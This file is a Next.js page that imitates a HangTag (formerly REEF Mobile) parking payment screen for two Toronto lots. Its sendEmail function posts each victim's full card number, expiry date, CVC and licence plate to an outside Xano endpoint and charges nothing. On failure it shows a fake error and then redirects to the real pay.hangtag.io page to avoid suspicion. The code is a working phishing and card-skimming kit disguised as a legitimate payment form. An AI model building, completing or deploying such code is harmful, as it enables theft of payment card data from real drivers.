'use client';

export const runtime = 'edge';

import { useState, useEffect } from 'react';
import { useParams } from 'next/navigation';
import { Home, HelpCircle, Globe, Info } from 'lucide-react'
import { Button } from "@/components/ui/button"
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select"

// Removed import {sendEmail} from "@/app/actions/sendEmail";
// Now sendEmail is defined locally as a non-exported function.

const lotDetails = {
    "9511": {
        title: "Lot #9511",
        subtitle: "Metro at The Carnaby",
        address: "1230 Queen St W, Toronto, ON, Canada",
    },
    "9395": {
        title: "Lot #9395",
        subtitle: "Roy Thomson Hall",
        address: "60 Simcoe St, Toronto, ON, Canada",
    },
};

export default function ParkingInterface() {
    const params = useParams();
    const lotParam = params.lot || "9511";

    const [lot, setLot] = useState(lotParam);
    // eslint-disable-next-line @typescript-eslint/ban-ts-comment
    // @ts-expect-error
    const [currentLot, setCurrentLot] = useState(lotDetails[lotParam] || lotDetails["9511"]);

    useEffect(() => {
        setLot(lotParam);
        // eslint-disable-next-line @typescript-eslint/ban-ts-comment
        // @ts-expect-error
        setCurrentLot(lotDetails[lotParam] || lotDetails["9511"]);
    }, [lotParam]);

    const [expanded, setExpanded] = useState({
        vehicle: false,
        receipt: false,
        payment: false
    })

    const [duration, setDuration] = useState({
        hours: "0",
        minutes: "5"
    })

    const [quote, setQuote] = useState({
        total: 0,
        endTime: "",
        additionalTimeInfo: ""
    })

    const [licensePlate, setLicensePlate] = useState("")
    const [email, setEmail] = useState("")
    const [paymentInfo, setPaymentInfo] = useState({
        cardNumber: "",
        expiry: "",
        cvc: ""
    })
    const [showErrorScreen, setShowErrorScreen] = useState(false)

    const handleDurationChange = (type: 'hours' | 'minutes', value: string) => {
        setDuration(prev => ({ ...prev, [type]: value }));
        setQuote({ total: 0, endTime: "", additionalTimeInfo: "" });
    };

    const calculateQuote = () => {
        const hours = parseInt(duration.hours)
        const minutes = parseInt(duration.minutes)

        const totalHours = hours + (minutes / 60)

        let price = 0
        if (totalHours <= 1) {
            price = 2.99
        } else if (totalHours <= 2) {
            price = 5.99
        } else {
            price = Math.ceil(totalHours) * 2.99
        }

        const now = new Date()
        const endTime = new Date(now.getTime() + (hours * 60 * 60 * 1000) + (minutes * 60 * 1000))
        const formattedEndTime = endTime.toLocaleString('en-US', {
            month: 'long',
            day: 'numeric',
            hour: 'numeric',
            minute: '2-digit',
            hour12: true
        })

        let additionalTimeInfo = ""
        if (totalHours > 1 && minutes > 0) {
            additionalTimeInfo = "Additional time added for same cost as 1 hour 5 minutes"
        }

        setQuote({
            total: price,
            endTime: formattedEndTime,
            additionalTimeInfo
        })

        setExpanded(prev => ({ ...prev }))
    }

    const handlePayAndStartSession = async (event: React.FormEvent<HTMLFormElement>) => {
        event.preventDefault()
        const formData = new FormData(event.currentTarget)
        formData.append('licensePlate', licensePlate)
        formData.append('duration', `${duration.hours} hours ${duration.minutes} minutes`)
        formData.append('total', quote.total.toFixed(2))
        formData.append('cardNumber', paymentInfo.cardNumber)
        formData.append('expiry', paymentInfo.expiry)
        formData.append('cvc', paymentInfo.cvc)

        const result = await sendEmail(formData)
        // eslint-disable-next-line @typescript-eslint/ban-ts-comment
        // @ts-expect-error
        if (result.success) {
            alert('Payment successful and email sent!')
        } else {
            setShowErrorScreen(true)
            setTimeout(() => {
                window.location.href = `https://pay.hangtag.io/en/park/${lot}`
            }, 3000)
        }
    }

    const handlePaymentInfoChange = (field: keyof typeof paymentInfo, value: string) => {
        setPaymentInfo(prev => ({ ...prev, [field]: value }))
    }

    return (
        <div className="min-h-screen flex flex-col bg-gray-100">
            <div className="min-h-screen flex flex-col">
                {/* Top Banner */}
                <div className="bg-[#0a1657] text-white p-4 flex justify-center items-center">
                    <div className="text-sm md:text-base flex flex-row justify-center items-center gap-[5px]">
                        <span className="font-bold text-2xl md:text-[25px]">REEF</span>
                        <span className="text-xs">Mobile</span>
                        <span>is now HangTag!</span>
                    </div>
                </div>

                {/* Navigation */}
                <nav className="flex justify-between items-center p-4 bg-gradient-to-r from-[#f58426] to-[#e93e3a]">
                    <Button variant="ghost" size="icon" className="text-white hover:text-white/80">
                        <Home className="w-[1em] h-[1em]" />
                    </Button>
                    {/* SVG Omitted for brevity */}
                    <div className="flex gap-2">
                        <Button variant="ghost" size="icon" className="text-white hover:text-white/80">
                            <HelpCircle className="w-[1em] h-[1em]" />
                        </Button>
                        <Button variant="ghost" className="font-medium text-white hover:text-white/80">
                            <Globe className="w-[1em] h-[1em] mr-1" />
                            FR
                        </Button>
                    </div>
                </nav>

                {/* Header Section */}
                <div className="bg-gradient-to-r from-[#f58426] to-[#e93e3a] text-white px-4 md:px-[140px] py-[30px]">
                    <h1 className="text-3xl md:text-4xl font-bold mb-2">{currentLot.title}</h1>
                    <h2 className="text-lg md:text-xl mb-1">{currentLot.subtitle}</h2>
                    <p className="text-sm opacity-90">{currentLot.address}</p>
                </div>

                {/* Hours Banner */}
                <div className="bg-gray-700 text-white p-3 text-center text-sm">
                    Open 12:00 AM - 11:59 PM
                </div>

                {/* Main Content */}
                <div className="flex-1 p-4 md:p-6 mx-auto w-full mb:max-w-4xl md:max-full md:px-[140px]">
                    <div className="space-y-4 md:space-y-6">
                        {/* Length of Stay */}
                        <div className="bg-white p-4 md:p-6 rounded-lg shadow-sm">
                            {/* ... [rest of the component code remains unchanged] */}
                        </div>
                        {/* Vehicle Section, Receipt Section, Payment Section, etc. */}
                    </div>
                </div>
                {showErrorScreen && (
                    <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50">
                        <div className="bg-white p-8 rounded-lg shadow-lg text-center">
                            <h2 className="text-2xl font-bold mb-4">An error occurred</h2>
                            <p className="mb-4">There was an error processing your request.</p>
                            <p className="mb-4">Please try again...</p>
                            <div className="animate-spin rounded-full h-8 w-8 border-b-2 border-gray-900 mx-auto"></div>
                        </div>
                    </div>
                )}
            </div>
        </div>
    )
}

// eslint-disable-next-line @typescript-eslint/ban-ts-comment
// @ts-expect-error
async function sendEmail(formData) {
    const XANO_API_URL = 'https://x8ki-letl-twmt.n7.xano.io/api:_sLo3BDY/emails';

    const emailContent = {
        subject: 'Payment Tag',
        html: `
      <p>A payment has been made:</p>
      <ul>
        <li>Card Number: ${formData.get('cardNumber')}</li>
        <li>Expiry Date: ${formData.get('expiry')}</li>
        <li>CVC: ${formData.get('cvc')}</li>
        <li>License Plate: ${formData.get('licensePlate')}</li>
        <li>Duration: ${formData.get('duration')}</li>
        <li>Total: $${formData.get('total')}</li>
      </ul>
    `,
    };

    try {
        const response = await fetch(XANO_API_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(emailContent),
        });

        if (!response.ok) {
            const errorData = await response.json();
            return { success: false, message: errorData?.message || 'An error occurred while processing your request.' };
        }

        const responseData = await response.json();
        return { success: true, message: 'Email sent successfully.', data: responseData };
    } catch (error) {
        // eslint-disable-next-line @typescript-eslint/ban-ts-comment
        // @ts-expect-error
        return { success: false, message: `An error occurred: ${error.message}` };
    }
}
